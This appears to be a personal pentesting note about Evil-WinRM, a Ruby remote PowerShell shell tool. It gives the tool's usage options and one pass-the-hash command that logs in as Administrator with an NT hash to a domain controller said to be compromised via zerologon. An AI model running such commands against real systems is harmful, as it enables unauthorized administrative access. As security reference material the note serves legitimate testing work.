# Evil-WinRm 
An *evil* #WinRM (Windows Remote Management, #Microsoft implementation of #WS-Management protocol) shell for hacking/pentesting, written in #Ruby.

Github: https://github.com/Hackplayers/evil-winrm

NOTE: That it doesn't really use the WinRM protocl anymore, instead utilizing #PSRP ( #Powershell Remoting Protocol)

## Usage
Usage message:
```
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -h, --help                       Display this help message
```

## Examples
### Pass-the-Hash
Evil-WinRM can be used to perform #pass-the-hash attacks. The following is an example of such an attack on a #DC compromised by #zerologon:
`evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.234.114`

Results in:
![[evil-winrm-passthehash-dc.png]]